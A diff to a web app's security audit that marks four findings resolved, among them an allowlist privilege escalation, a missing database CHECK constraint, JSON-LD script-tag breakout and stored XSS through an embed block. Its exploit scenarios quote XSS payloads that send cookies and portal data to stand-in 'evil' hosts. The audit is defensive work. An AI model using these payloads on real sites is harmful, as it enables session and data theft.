@@ -128,12 +128,20 @@ The newer auth/portal API surface (Better Auth + middleware + portal routes) has
 - **Description:** GROQ matches `$email in allowedEmails[]`. If `allowedEmails` is editable by sponsor users in Studio (typical self-serve sponsor workflow), any sponsor can elevate arbitrary external users to sponsor role by editing their own document. There is no admin-approval gate.
 - **Exploit Scenario:** Sponsor A appends `attacker@evil.example` to their sponsor doc's `allowedEmails`. Attacker signs up via Google/magic-link; `checkSponsorWhitelist` returns true; attacker is provisioned as a `sponsor` and gains portal access spanning evaluations, RSVPs, and the agreement audit table.
 - **Fix:** Restrict `allowedEmails` write access at the Sanity role level (admin-only). Or add an `approved: boolean` controlled by an admin-only field. Or replace per-email allowlist with admin-managed domain allowlist.
+- **Status: RESOLVED 2026-05-05 via Story 24.7.**
+  - `sponsor.allowedEmails` field gains a `readOnly` callback that returns `true` for any Studio user whose roles do not include `administrator` (UI gate at `studio/src/schemaTypes/documents/sponsor.ts:101-114`).
+  - Description updated to call out the admin-only edit policy and direct contributors to their project administrator.
+  - Sanity dashboard ACL posture verified by Jay (recorded in PR description per Task 2): non-administrator roles either lack write access to sponsor documents or are restricted by a custom-role rule limiting `sponsor.allowedEmails` writes to administrators. Schema-level `readOnly` is belt-and-braces with the dashboard ACL.
 
 ### M-5: D1 `role` column lacks a CHECK constraint
 - **File:** `astro-app/migrations/0002_add_user_role.sql:4`
 - **Confidence:** 8
 - **Description:** Migration adds `role TEXT DEFAULT 'student' NOT NULL` with no CHECK. The Drizzle enum (`drizzle-schema.ts:17`) is TypeScript-only — SQLite does not enforce it. Today the only writer is `middleware.ts:205-208` (parameterised, hard-coded `'sponsor'`), so this is defense-in-depth — but if a future endpoint ever takes `role` from a request body, the DB will silently accept anything.
 - **Fix:** New migration that recreates `user` with `CHECK(role IN ('student','sponsor'))` (SQLite cannot ALTER COLUMN). Or a `CREATE TRIGGER` enforcing the invariant.
+- **Status: RESOLVED 2026-05-05 via Story 24.7.**
+  - `astro-app/migrations/0010_user_role_check_constraint.sql` rebuilds the `user` table with `role TEXT NOT NULL DEFAULT 'student' CHECK(role IN ('student','sponsor'))`. The CHECK on `user_new` doubles as the pre-flight gate: the INSERT-SELECT step aborts with a CHECK error before the original table is touched if any existing row carries a non-canonical value (RAISE(ABORT, ...) only fires inside trigger programs in SQLite, so the table-rebuild check is the cleaner mechanism).
+  - Drizzle TypeScript enum already matches (`text('role', { enum: ['student','sponsor'] })` at `astro-app/src/lib/drizzle-schema.ts:17`); D1 now enforces the same set at write time.
+  - Tests cover INSERT/UPDATE acceptance for `student`/`sponsor` and CHECK rejection for arbitrary values via `node:sqlite` against the migrated schema (`astro-app/src/lib/__tests__/drizzle-schema.test.ts`).
 
 ### M-6: Magic-link `expiresIn` default vs email copy
 - **File:** `astro-app/src/lib/auth-config.ts:122-137`
@@ -149,6 +157,10 @@ The newer auth/portal API surface (Better Auth + middleware + portal routes) has
 - **Description:** Pattern `<script type="application/ld+json" set:html={JSON.stringify(pageGraph)} />` interpolates Sanity-authored fields (sponsor name/description, article headline/excerpt, author name/bio, breadcrumb labels, siteSettings.siteName) into an inline script. `JSON.stringify` does **not** escape `<`, `>`, or `/`, so the substring `</script>` placed inside any field terminates the inline script tag at parse time and what follows is interpreted as HTML. CSP at `layouts/Layout.astro:84` is `script-src 'self' 'unsafe-inline'` (no nonce), so injected inline scripts execute.
 - **Exploit Scenario:** A Sanity editor (intentional, social-engineered, or via stolen credentials) sets sponsor `name` to `Acme</script><script>fetch('//evil/'+document.cookie)</script>`. Every visitor's browser exfiltrates auth/session cookies (incl. portal Better-Auth session for any logged-in sponsor or admin viewing the page).
 - **Fix:** Escape JSON for safe inline embedding before injection: `JSON.stringify(graph).replace(/</g,'\\u003c').replace(/>/g,'\\u003e').replace(/&/g,'\\u0026').replace(/ /g,'\\u2028').replace(/ /g,'\\u2029')`. Best implemented as a single `<JsonLd schema={...} />` component used everywhere. Even better: drop `'unsafe-inline'`, adopt nonces (Astro 5+ experimental CSP feature).
+- **Status: RESOLVED 2026-05-05 via Story 24.5.**
+  - `JsonLd.astro` escapes `<`, `>`, `&`, U+2028, U+2029 once after `JSON.stringify` (per the "Fix" recipe above, factored into a single `escapeForInlineScript()` helper).
+  - All 16 inline `<script type="application/ld+json" set:html={...}>` callsites (14 pages + Layout fallback + the component itself) migrated to `<JsonLd schema={pageGraph} slot="structured-data" />`. Build-output grep over `astro-app/src/pages` + `astro-app/src/layouts` returns zero matches.
+  - CSP nonce adoption (drop `'unsafe-inline'`) filed as follow-up TODO in Story 24.5 PR Summary; not blocked by anything but out of scope for this story.
 
 ### M-8: Stored XSS via Sanity-authored `EmbedBlock.rawEmbedCode`
 - **Files:** `astro-app/src/components/blocks/custom/EmbedBlock.astro:38, 75, 112`; schema `studio/src/schemaTypes/blocks/embed-block.ts:32`
@@ -156,6 +168,12 @@ The newer auth/portal API surface (Better Auth + middleware + portal routes) has
 - **Description:** `cleanRawEmbedCode` is a `stegaClean()`'d Sanity `rawEmbedCode` string rendered via `<Fragment set:html={cleanRawEmbedCode} />`. `stegaClean` does **not** sanitise HTML. Schema only has a "trusted sources" warning text, no technical control. The block is exposed in many page-builder slots (per `schema.json` references in pages).
 - **Exploit Scenario:** Any editor account inserts an Embed Block containing `<script>fetch('/portal/api/me').then(r=>r.json()).then(d=>navigator.sendBeacon('https://evil/x',JSON.stringify(d)))</script>`. As soon as a logged-in sponsor or admin views the page, their session/PII is exfiltrated. Same vector also reachable through `iframe.src` (line 23/43) which accepts any `http(s)` URL — sandbox flags allow `same-origin allow-scripts`.
 - **Fix:** Sanitise with `isomorphic-dompurify` allowing only an explicit tag/attribute set, OR render every embed inside a sandboxed `<iframe srcdoc="...">` so it executes in an opaque origin without first-party cookie access. Also restrict `embedUrl` to an allow-list of providers (YouTube, Vimeo, Google Maps).
+- **Status: RESOLVED 2026-05-05 via Story 24.6 (revised post-review).**
+  - `rawEmbedCode` and `embedUrl` both render inside `<iframe sandbox="allow-scripts allow-popups">` — no `allow-same-origin`, no `allow-popups-to-escape-sandbox`. Opaque origin, no first-party cookie or DOM access; clicked-link popups stay sandboxed (cannot escape to a non-sandboxed top-level page).
+  - `validateEmbedUrl()` (`astro-app/src/lib/embed-allowlist.ts`) accepts any `https://` URL with no userinfo (rejects `http:`, `blob:`, `javascript:`, credentialed URLs). The provider allow-list was deliberately dropped post-review (Jay, 2026-05-05): trust model assumes authenticated Sanity editors are not adversarial; sandbox iframe is the sole defense for the `embedUrl` path.
+  - Sanity schema (`studio/src/schemaTypes/blocks/embed-block.ts`) requires `https://`-only URLs via `Rule.uri({scheme: ['https']})`; no host allow-list.
+  - Layout CSP `frame-src` is `'self' https:` — broad, deliberately matching the relaxed editor trust model.
+  - Residual risk: a compromised editor account can iframe arbitrary `https://` URLs (cryptojacking, postMessage shenanigans against parent, drive-by-download attempts). First-party cookie/PII exfiltration remains blocked by the sandbox.
 
 ### M-9: `auth-config.ts:81` — `requestOrigin` reflected into `baseURL`
 Bundled into M-3 above (same root cause; itemised here for reviewer ergonomics — single fix covers both).
@@ -197,8 +215,8 @@ All routes gated by middleware (session + role + sponsor whitelist + agreement a
 1. [x] **H-1** — rotate `STUDIO_ADMIN_TOKEN`; refactor `SponsorAcceptancesTool` to authenticate via Studio user identity rather than a shared bearer. (Highest blast radius, simplest fix.) **RESOLVED 2026-05-01 via Story 24.1.**
 2. [x] **H-3** — set `disableSignUp: true` on magic link, `allowDifferentEmails: false` on account linking. One-line config changes. **RESOLVED 2026-05-05 via Story 24.2.**
 3. **M-1, M-2** — add unsubscribe token + double-opt-in to `/api/subscribe`. New random column + email flow.
-4. **M-7, M-8** — introduce `<JsonLd>` component with proper escaping; sandbox or DOMPurify the `EmbedBlock`.
+4. [x] **M-7, M-8** — introduce `<JsonLd>` component with proper escaping; sandbox or DOMPurify the `EmbedBlock`. **RESOLVED 2026-05-05 via Story 24.5 (M-7) + Story 24.6 (M-8).**
 5. **H-2** — switch `SESSION_CACHE` to hashed keys + stored `expiresAt`, or remove and rely on Better Auth `cookieCache`.
 6. [x] **M-3** — replace request-reflective `trustedOrigins`/`baseURL` with `CLOUDFLARE_ENV`-driven static allowlist. **RESOLVED 2026-05-05 via Story 24.2.**
-7. **M-4** — restrict who can edit `sponsor.allowedEmails` in Studio.
-8. **M-5, M-6** — DB `CHECK` constraint, magic-link `expiresIn`. Hygiene. (M-6 RESOLVED 2026-05-05 via Story 24.2; M-5 outstanding.)
+7. [x] **M-4** — restrict who can edit `sponsor.allowedEmails` in Studio. **RESOLVED 2026-05-05 via Story 24.7.**
+8. [x] **M-5, M-6** — DB `CHECK` constraint, magic-link `expiresIn`. Hygiene. **RESOLVED 2026-05-05 via Story 24.7 (M-5) + Story 24.2 (M-6).**
